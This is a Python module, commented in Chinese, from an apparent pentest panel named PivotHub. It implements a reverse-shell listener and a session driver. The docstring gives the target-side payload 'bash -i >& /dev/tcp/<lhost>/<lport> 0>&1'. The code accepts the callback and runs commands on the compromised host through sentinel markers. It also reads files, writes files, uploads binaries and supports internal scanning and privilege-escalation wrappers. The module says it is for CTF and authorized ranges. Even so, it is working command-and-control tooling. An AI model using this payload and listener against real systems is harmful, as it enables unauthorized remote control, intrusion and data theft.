"""反弹 Shell 通道：攻击机侧监听 + 目标侧回连后的会话驱动（会话层新增能力）。

用途（CTF/授权靶场常见链路）：目标机上执行
    bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
攻击机侧由本模块监听端口、接收连接，并以「哨兵标记」实现命令-回显同步，
从而把反弹 Shell 也纳入统一会话抽象层（路由层零 socket 命令）。

硬约束：
- 只监听用户显式指定的地址/端口，默认 127.0.0.1（合规：面板不对外暴露）；
  真实靶场需靶机回连攻击机 VPN 地址时，由操作者显式传 bind=攻击机地址；
- 命令与回显全部真实读取，读不到就如实失败（不伪造）。
"""

from __future__ import annotations

import re
import socket
import threading
import time
import uuid
from typing import Optional

from .base import ExecResult, FileEntry, SessionBase, SessionError, ls_error_text, parse_ls_output

#: 默认等待回连时长（秒）
DEFAULT_WAIT = 90.0

#: ANSI 控制序列（CSI / 字符集指定 ESC(B / OSC / 单字符转义）——渲染与回显清洗共用
_ANSI_RE = re.compile(
    r"\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)"      # OSC … BEL/ST
    r"|\x1b\[[0-9;?<=>!]*[ -/]*[@-~]"          # CSI
    r"|\x1b[()][0-2A-Za-z]"                    # ESC ( B / ESC ) 0
    r"|\x1b[=>78MDEH]"                         # 单字符转义
)


def _line_value(line: str) -> str:
    """去掉行尾换行与 PTY 的 ``\\r`` 回车覆盖前缀，得到该行「当前显示的内容」。"""
    return line.rstrip("\r\n").rsplit("\r", 1)[-1].strip()


def _is_marker_line(line: str, marker: str) -> bool:
    """哨兵命中判定：**行尾**是 marker，且该行不是哨兵命令自身的回显。

    ⚠ 不能用子串包含：PTY 会把 ``echo PH_xxx`` 整行原样回显，子串匹配会在命令
    尚未执行时立即命中（历史表现：扫描 0 台主机 / cat 无输出）。
    ⚠ 也不能要求「整行恰好等于 marker」：shell 的提示符没有换行结尾，
    ``<prompt>$ PH_xxx`` 会粘在提示符后面——判据是「行尾是 marker 但行尾不是
    ``echo <marker>``」，两者一次覆盖。
    """
    v = _line_value(line)
    return v.endswith(marker) and not v.endswith(f"echo {marker}")


def marker_index(chunk: str, marker: str) -> int:
    """返回命中哨兵那一行的起始下标；没有返回 -1。"""
    pos = 0
    for line in chunk.split("\n"):
        if _is_marker_line(line, marker):
            return pos
        pos += len(line) + 1
    return -1


def marker_line(line: str, marker: str) -> bool:
    """单行哨兵判定（exec_stream 按行消费时使用）。"""
    return _is_marker_line(line, marker)


def _is_marker_echo(line: str, marker: str) -> bool:
    """是否为「哨兵命令自身的回显行」（``echo PH_x``，可能带提示符前缀）。

    PTY 通道上这行一定会出现，不能混进命令输出（否则会被当成扫描结果/文件内容）。
    """
    v = _line_value(line)
    return v == f"echo {marker}" or v.endswith(f"echo {marker}")


def _strip_echo(out: str, cmd: str, marker: str = "") -> str:
    """去掉 PTY 回显的命令行、哨兵回显行、ANSI 控制序列与空行。"""
    out = _ANSI_RE.sub("", out)
    out = out.replace("\r\n", "\n").replace("\r", "")
    lines = [l for l in out.split("\n")
             if l.strip() and l.strip() != cmd.strip()
             and not (marker and _is_marker_echo(l, marker))]
    return "\n".join(lines)


class ReverseShellListener:
    """一次监听：等待一个回连，成功后可取回通道。"""

    def __init__(self, bind: str, port: int, label: str = "",
                 listener_id: str | None = None) -> None:
        self.bind = bind
        self.port = int(port)
        self.label = label
        #: 持久化恢复时沿用原 id（面板重启后前端仍能对应同一条监听）
        self.id = listener_id or ("rev-" + uuid.uuid4().hex[:8])
        self.connected = threading.Event()
        self._sock: Optional[socket.socket] = None
        self._conn: Optional[socket.socket] = None
        self._peer: tuple[str, int] | None = None
        self._error = ""
        self._thread: Optional[threading.Thread] = None
        self._stop = threading.Event()
        #: 通道已被 take() 取走转为会话（此时监听 socket 已关闭，不能再显示「等待回连」）
        self.consumed = False

    # ---- 生命周期 ----

    def start(self) -> None:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((self.bind, self.port))
        except OSError as e:
            try:
                s.close()
            except OSError:
                pass
            code = getattr(e, "winerror", None) or e.errno
            if code in (10049, 99):  # WSAEADDRNOTAVAIL / EADDRNOTAVAIL
                hint = f" —— 本机当前没有地址 {self.bind}（休眠 / 换网后 IP 可能变了），请重新检测本机 IP"
            elif code in (10048, 98):  # WSAEADDRINUSE / EADDRINUSE
                hint = " —— 端口被其他程序占用，请换一个端口"
            else:
                hint = ""
            raise SessionError(f"监听失败 {self.bind}:{self.port} - {e}{hint}") from e
        s.listen(4)
        s.settimeout(1.0)
        self._sock = s
        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()

    def _accept_loop(self) -> None:
        assert self._sock is not None
        deadline = time.time() + 3600
        while not self._stop.is_set() and time.time() < deadline:
            try:
                conn, peer = self._sock.accept()
            except socket.timeout:
                continue
            except OSError as e:
                self._error = str(e)
                return
            self._conn = conn
            self._peer = (peer[0], peer[1])
            self.connected.set()
            return

    def wait(self, timeout: float = DEFAULT_WAIT) -> bool:
        return self.connected.wait(timeout)

    def take(self) -> "ReverseShellChannel":
        if not self._conn:
            raise SessionError(self._error or "尚无回连")
        conn = self._conn
        self._conn = None
        # 通道已被取走：清掉回连标记并释放监听 socket，否则端口会被这条监听一直占着
        # （表现就是「该地址端口已在监听」，休眠/重建会话后无法在同端口重开）。
        self.connected.clear()
        self.consumed = True
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None
        return ReverseShellChannel(conn, self._peer or ("?", 0), label=self.label)

    def close(self) -> None:
        self._stop.set()
        for s in (self._sock, self._conn):
            try:
                if s:
                    s.close()
            except OSError:
                pass
        self._sock = None
        self._conn = None

    @property
    def peer(self) -> tuple[str, int] | None:
        return self._peer

    def to_dict(self) -> dict:
        return {"id": self.id, "bind": self.bind, "port": self.port, "label": self.label,
                "connected": self.connected.is_set(), "peer": self._peer, "error": self._error,
                "consumed": self.consumed}


class ReverseShellChannel(SessionBase):
    """回连通道驱动：单读线程 + 共享缓冲，同时支撑「原始交互」与「哨兵同步」两种消费。

    为什么不是直接 recv：反弹通道是真实 PTY，交互式命令（ping / mysql / su）不能靠
    「发命令再等 echo 标记」同步——命令不退出就永远等不到标记，交互程序还会把标记
    当输入吃掉，会话随即卡死。这里由读线程统一收数据进缓冲：
      · 原始模式（raw sink）把同一份数据实时推给面板终端，真实提示符原样显示；
      · exec/exec_stream 从缓冲里按哨兵标记取结果，超时/取消会发 Ctrl+C 中断目标侧命令；
      · 哨兵命令执行期间暂停 raw 推送，面板里不会出现内部标记行。
    """

    kind = "reverse-shell"
    #: 回连方平台：登记时按回显识别（见 detect_platform），识别不出保守按 linux
    platform = "linux"
    #: 缓冲区上限（无 exec 在跑时裁剪，只保留尾部）
    MAX_BUF = 4 * 1024 * 1024

    def __init__(self, conn: socket.socket, peer: tuple[str, int], label: str = "") -> None:
        self.conn = conn
        self.peer = peer
        self.label = label
        self.timeout = 15.0
        try:
            self.conn.settimeout(0.5)
        except OSError:
            pass
        self._cond = threading.Condition(threading.RLock())
        self._send_lock = threading.Lock()
        self._buf = ""
        self._eof = False
        self._exec_depth = 0
        #: 最近一次 exec 的预计结束时刻：即使计数因异常路径泄漏，抑制也会自动过期
        self._busy_until = 0.0
        self._raw_sinks: list = []
        self._eof_hooks: list = []
        self._stop = threading.Event()
        self._reader = threading.Thread(target=self._read_loop, daemon=True)
        self._reader.start()

    # ---- 读线程与缓冲 ----

    def _read_loop(self) -> None:
        while not self._stop.is_set():
            try:
                data = self.conn.recv(65536)
            except socket.timeout:
                continue
            except OSError:
                break
            if not data:
                break
            text = data.decode("utf-8", "replace")
            with self._cond:
                self._buf += text
                if self._exec_depth == 0 and len(self._buf) > self.MAX_BUF:
                    self._buf = self._buf[-self.MAX_BUF:]
                busy = self._is_busy_locked()
                self._cond.notify_all()
            if not busy:
                self._emit_raw(text)
        with self._cond:
            self._eof = True
            hooks = list(self._eof_hooks)
            self._cond.notify_all()
        self._emit_raw("\n[PivotHub] 通道已关闭（对端断开）\n")
        for fn in hooks:  # 让上层把会话标记为断线（绿点不能骗人）
            try:
                fn()
            except Exception:
                pass

    def recent_output(self, max_bytes: int = 8192) -> str:
        """缓冲尾部文本：终端打开时回放，补回连接横幅 / 首屏提示符等历史细节。

        哨兵命令的回显与提示符在同一行（`<PS1> echo PH_xxx`），所以按「删除标记片段」
        而不是「丢弃整行」处理——否则最后那个提示符会被一起吃掉。
        """
        with self._cond:
            tail = self._buf[-max_bytes:]
        keep = []
        for line in tail.split("\n"):
            line = line.replace("echo __PIVOTHUB_ALIVE__", "").replace("__PIVOTHUB_ALIVE__", "")
            line = re.sub(r"echo PH_[0-9a-f]{8,}", "", line)
            line = re.sub(r"PH_[0-9a-f]{8,}", "", line)
            keep.append(line)
        return "\n".join(keep)

    def _emit_raw(self, text: str) -> None:
        with self._cond:
            sinks = list(self._raw_sinks)
        for sink in sinks:
            try:
                sink(text)
            except Exception:  # 单个订阅者异常不影响通道
                pass

    def _snapshot(self, start: int) -> tuple[str, bool]:
        with self._cond:
            return self._buf[start:], self._eof

    def _is_busy_locked(self) -> bool:
        """是否正有哨兵命令在执行（调用方需已持有 _cond）。带过期时间防泄漏。"""
        return self._exec_depth > 0 and time.time() < self._busy_until

    def _begin_exec(self, timeout: float = 15.0) -> int:
        with self._cond:
            start = len(self._buf)
            self._exec_depth += 1
            self._busy_until = max(self._busy_until, time.time() + max(1.0, timeout) + 5.0)
            return start

    def _end_exec(self) -> None:
        with self._cond:
            self._exec_depth = max(0, self._exec_depth - 1)
            if self._exec_depth == 0:
                self._busy_until = 0.0
            self._cond.notify_all()

    def _send(self, text: str) -> None:
        with self._send_lock:
            self.conn.sendall(text.encode("utf-8"))

    def _interrupt(self) -> None:
        """向目标侧发 Ctrl+C（中断卡住的命令，恢复提示符）。"""
        try:
            self._send("\x03")
        except OSError:
            pass

    # ---- SessionBase ----

    def test(self) -> ExecResult:
        return self.exec("echo __PIVOTHUB_ALIVE__")

    def exec(self, cmd: str, timeout: float = 15.0) -> ExecResult:
        from .base import wrap_privileged_cmd

        # 提权上下文：走 wrap_privileged_cmd 落盘执行，避免包裹器模板引号被命令里的引号撕碎
        cmd = wrap_privileged_cmd(cmd, getattr(self, "cmd_wrapper", ""),
                                  platform=self.platform)
        marker = "PH_" + uuid.uuid4().hex[:10]
        start = self._begin_exec(timeout)
        t0 = time.perf_counter()
        try:
            try:
                self._send(f"{cmd}\n")
                self._send(f"echo {marker}\n")
            except OSError as e:
                return ExecResult(ok=False, error=f"通道写入失败: {e}")
            deadline = time.time() + max(1.0, timeout)
            while True:
                chunk, eof = self._snapshot(start)
                idx = marker_index(chunk, marker)
                if idx >= 0:
                    return ExecResult(ok=True, output=_strip_echo(chunk[:idx], cmd, marker),
                                      ms=int((time.perf_counter() - t0) * 1000))
                if eof:
                    return ExecResult(ok=False, error="对端已关闭连接",
                                      output=_strip_echo(chunk, cmd, marker),
                                      ms=int((time.perf_counter() - t0) * 1000))
                if time.time() >= deadline:
                    break
                with self._cond:
                    self._cond.wait(0.3)
            # 超时：Ctrl+C 中断目标侧命令，否则 ping / mysql 这类命令会把会话一直占住
            self._interrupt()
            time.sleep(0.4)
            chunk, _ = self._snapshot(start)
            idx = marker_index(chunk, marker)
            out = (_strip_echo(chunk[:idx], cmd, marker) if idx >= 0
                   else _strip_echo(chunk, cmd, marker))
            return ExecResult(ok=False, output=out, timed_out=True,
                              error=f"命令超时（>{timeout}s），已向目标发送 Ctrl+C",
                              ms=int((time.perf_counter() - t0) * 1000))
        finally:
            self._end_exec()

    def exec_stream(self, cmd: str, on_line, timeout: float = 300.0,
                    cancel=None) -> ExecResult:
        """流式执行：边收边按行回调（长任务实时日志，如 fscan 扫内网）。

        与 exec 共用读线程与缓冲；取消/超时都会向目标侧发 Ctrl+C，已收内容保留。
        """
        marker = "PH_" + uuid.uuid4().hex[:10]
        start = self._begin_exec(timeout)
        t0 = time.perf_counter()
        lines: list[str] = []
        consumed = 0

        def done(ok: bool, error: str = "", timed_out: bool = False) -> ExecResult:
            return ExecResult(ok=ok, output="\n".join(lines), error=error,
                              timed_out=timed_out,
                              ms=int((time.perf_counter() - t0) * 1000))

        try:
            try:
                self._send(f"{cmd}\n")
                self._send(f"echo {marker}\n")
            except OSError as e:
                return ExecResult(ok=False, error=f"通道写入失败: {e}")
            deadline = time.time() + max(1.0, timeout)
            while True:
                if cancel is not None and cancel.is_set():
                    self._interrupt()
                    return done(False, "已取消")
                chunk, eof = self._snapshot(start)
                new = chunk[consumed:]
                while "\n" in new:
                    line, new = new.split("\n", 1)
                    consumed += len(line) + 1
                    if marker_line(line, marker):
                        return done(True)
                    if _is_marker_echo(line, marker):
                        continue
                    line = self._clean_line(line)
                    if line.strip() and line.strip() != cmd.strip():
                        lines.append(line)
                        on_line(line)
                if marker_line(new, marker):  # 标记行没有换行结尾（罕见）
                    return done(True)
                if eof:
                    return done(False, "对端已关闭连接")
                if time.time() >= deadline:
                    break
                with self._cond:
                    self._cond.wait(0.3)
            self._interrupt()
            return done(False, f"命令超时（>{timeout}s），已向目标发送 Ctrl+C", timed_out=True)
        finally:
            self._end_exec()

    @staticmethod
    def _clean_line(line: str) -> str:
        line = _ANSI_RE.sub("", line)
        return line.rstrip("\r")

    @staticmethod
    def _cut_sentinel(chunk: str, marker: str, cmd: str) -> str:
        """截到「独占一行的哨兵」之前（跳过 PTY 回显的 ``echo PH_x`` 行）。"""
        idx = marker_index(chunk, marker)
        return _strip_echo(chunk if idx < 0 else chunk[:idx], cmd, marker)

    @staticmethod
    def _strip_echo(out: str, cmd: str, marker: str = "") -> str:
        return _strip_echo(out, cmd, marker)

    def list_dir(self, path: str) -> list[FileEntry]:
        res = self.exec(f"ls -la --time-style=+%Y-%m-%d\\ %H:%M {path!r} 2>&1")
        if not res.ok:
            raise SessionError(res.error or "列目录失败")
        entries = [e for e in parse_ls_output(res.output) if e.name not in (".", "..")]
        if not entries:
            err = ls_error_text(res.output)
            if err:
                raise SessionError(f"列目录失败: {err}")
        return entries

    def read_file(self, path: str, max_bytes: int = 512 * 1024) -> str:
        res = self.exec(f"cat {path!r} | head -c {max_bytes}")
        if not res.ok:
            raise SessionError(res.error or "读取失败")
        return res.output

    def write_file(self, path: str, content: str) -> None:
        import base64 as _b64

        payload = _b64.b64encode(content.encode()).decode()
        res = self.exec(f"echo {payload} | base64 -d > {path!r}")
        if not res.ok:
            raise SessionError(res.error or "写入失败")

    def write_file_b64(self, path: str, b64: str, append: bool = False) -> None:
        op = ">>" if append else ">"
        # 分块可达 1.2MB（base64 1.6MB）：慢链路下默认 15s 会把块写一半就超时中断，
        # 落盘成截断文件（Go 二进制随后 Bus error）。这里给足时间。
        res = self.exec(f"echo {b64} | base64 -d {op} {path!r}", timeout=180)
        if not res.ok:
            raise SessionError(res.error or "二进制写入失败")

    def close(self) -> None:
        self._stop.set()
        try:
            self.conn.close()
        except OSError:
            pass

    # ---- 原始交互（面板终端直连 PTY）----

    def add_raw_sink(self, sink) -> None:
        with self._cond:
            if sink not in self._raw_sinks:
                self._raw_sinks.append(sink)

    def remove_raw_sink(self, sink) -> None:
        with self._cond:
            if sink in self._raw_sinks:
                self._raw_sinks.remove(sink)

    def add_eof_hook(self, fn) -> None:
        """通道关闭时回调（上层据此把会话标记断线，避免列表里残留绿点）。"""
        with self._cond:
            if fn not in self._eof_hooks:
                self._eof_hooks.append(fn)

    def write_raw(self, text: str) -> None:
        """不经哨兵，直接把原始输入写进目标 PTY（含 Ctrl+C 等控制字符）。"""
        self._send(text)

    def send_raw(self, text: str) -> None:
        """兼容旧接口：/io 的 send 分支使用。"""
        self.write_raw(text)

    def read_until(self, patterns: list[str], timeout: float = 20.0,
                   max_bytes: int = 262144) -> tuple[str, str]:
        """读取新数据直到命中任一模式（返回 (已读文本, 命中的模式)；超时返回 ('', '')）。"""
        start = len(self._buf)
        deadline = time.time() + max(1.0, timeout)
        while True:
            chunk, eof = self._snapshot(start)
            for p in patterns:
                if p in chunk:
                    return chunk, p
            if eof or len(chunk) > max_bytes or time.time() >= deadline:
                return "", ""
            with self._cond:
                self._cond.wait(0.3)


class ReverseShellService:
    """进程内监听表：open / wait / take / list / close。"""

    def __init__(self) -> None:
        self._listeners: dict[str, ReverseShellListener] = {}
        self._lock = threading.Lock()

    def open(self, bind: str, port: int, label: str = "",
             replace_pending: bool = True, listener_id: str | None = None
             ) -> tuple["ReverseShellListener", bool]:
        """开监听。同地址端口已有「未回连」的监听时默认替换（休眠/断线后残留的监听会占住端口）。

        返回 (listener, replaced)。已有回连通道时拒绝替换——那条会话还在用这个端口。
        listener_id 用于面板重启后按持久记录恢复监听（沿用原 id）。
        """
        with self._lock:
            old = next(
                (l for l in self._listeners.values() if l.bind == bind and l.port == int(port)),
                None,
            )
            replaced = False
            if old is not None:
                if old.connected.is_set():
                    raise SessionError(
                        f"该端口已有回连会话（listener {old.id}）：请先在监听列表里关闭它，再重新开监听"
                    )
                if not replace_pending:
                    raise SessionError(f"该地址端口已在监听: {bind}:{port}（listener {old.id}）")
                self._listeners.pop(old.id, None)
                old.close()
                replaced = True
            lis = ReverseShellListener(bind, int(port), label, listener_id=listener_id)
            lis.start()
            self._listeners[lis.id] = lis
            return lis, replaced

    def get(self, listener_id: str) -> ReverseShellListener:
        lis = self._listeners.get(listener_id)
        if not lis:
            raise SessionError(f"监听不存在: {listener_id}")
        return lis

    def list(self) -> list[dict]:
        return [l.to_dict() for l in self._listeners.values()]

    def close(self, listener_id: str) -> bool:
        with self._lock:
            lis = self._listeners.pop(listener_id, None)
        if not lis:
            return False
        lis.close()
        return True

    def close_all(self) -> int:
        with self._lock:
            listeners = list(self._listeners.values())
            self._listeners.clear()
        for lis in listeners:
            lis.close()
        return len(listeners)


#: 进程内单例（面板一次运行内的监听表）
SERVICE = ReverseShellService()


#: 平台识别用：Linux 系系统名 / Windows 的「命令不存在」回显 / Windows 字样
_UNIX_RE = re.compile(r"\b(Linux|Darwin|FreeBSD|OpenBSD|NetBSD)\b", re.I)
_WIN_ERR_RE = re.compile(r"不是内部或外部命令|is not recognized|无法将|CommandNotFound", re.I)
_WIN_RE = re.compile(r"Windows|Microsoft", re.I)


def detect_platform(ch: "ReverseShellChannel") -> str:
    """按回连回显判定目标平台（'linux' / 'windows'，识别不出返回 ''）。

    探针 `uname -s`：Linux/macOS 直接给出系统名；Windows（cmd / PowerShell）下 uname
    不存在，回显是「不是内部或外部命令 / 无法将…识别为 cmdlet」，据此判定为 Windows。
    两者都无结论时补一次 `ver`（Windows 独有）。调用方对 '' 按 linux 兜底。
    """
    try:
        res = ch.exec("uname -s", timeout=8)
        text = (res.output or "") + "\n" + (res.error or "")
    except Exception:
        text = ""
    if _UNIX_RE.search(text):
        return "linux"
    if _WIN_ERR_RE.search(text) or _WIN_RE.search(text):
        return "windows"
    try:
        res2 = ch.exec("ver", timeout=8)
        text2 = (res2.output or "") + "\n" + (res2.error or "")
    except Exception:
        text2 = ""
    if _WIN_RE.search(text2):
        return "windows"
    if _UNIX_RE.search(text2):
        return "linux"
    return ""
